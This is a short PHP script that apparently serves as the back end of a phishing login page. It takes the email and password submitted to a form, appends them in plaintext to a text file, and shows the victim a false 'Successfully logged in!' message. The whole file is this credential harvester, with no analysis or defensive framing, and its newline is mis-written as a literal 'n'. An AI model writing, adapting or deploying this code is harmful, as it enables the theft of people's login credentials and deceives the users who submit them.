<?php
$email = $_POST['email'];
$pswd = $_POST['password'];
//$f="form.txt";
$fp = fopen('form.txt', 'a');
$string = $email . ':' . $pswd . 'n';
fwrite($fp, $string);
fclose($fp);
echo "Successfully logged in!";
?>